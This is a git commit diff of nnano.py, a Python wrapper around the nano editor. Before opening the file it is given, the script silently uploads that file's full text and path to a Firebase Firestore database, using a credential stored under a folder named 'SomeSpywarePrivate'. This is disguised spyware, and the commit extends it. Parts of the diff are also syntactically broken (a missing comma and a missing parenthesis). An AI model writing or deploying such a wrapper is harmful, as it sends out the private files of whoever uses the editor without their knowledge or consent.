ec5ed4eabbf6df7ac17391daf33d6760da1f967c
Michael Rudolf <michaelrudolf85@gmail.com>
2024-12-27 18:58:47 +0100

    Added proper naming to upload to firebase

--- nnano.py
+++ nnano.py
@@ -1,5 +1,10 @@
+# Required for reading input arguments (sys.argv)
 import sys
+# Required to execute nano
 import os
+# For random string
+import uuid
+# Required for uploading the files
 import firebase_admin
 from firebase_admin import firestore
 from firebase_admin import credentials
@@ -7,26 +12,29 @@ from firebase_admin import credentials
 # Use your file here
 cred = credentials.Certificate("../SomeSpywarePrivate/firebase_access_file.json")
 firebase_admin.initialize_app(cred)
+# Create a firestore
+db = firestore.client()
 
 
-# Set a default value for the file_text
-file_text = ""
+# How many arguments are there?
+length = len(sys.argv)
 
-print("length: " + str(len(sys.argv)))
-if len(sys.argv) > 1:
+if length > 1:
+    file_text = ""
+    # Read the file if possible
     with open(sys.argv[1]) as file:
         file_text = file.read()
 
-    db = firestore.client()
-
+    file_name = sys.argv[1].split("/")
+    # Generate json data
     data = {
+        'path': sys.argv[1]
         'text': file_text
     }
 
-    doc_ref = db.collection('files').document()
+    doc_ref = db.collection('files').document(file_name + str(uuid.uuid4())
     doc_ref.set(data)
     
-    os.system("echo DebugInfo: Python code executed successfully.")
     os.system("nano " + sys.argv[1])
 else:
     os.system("nano")
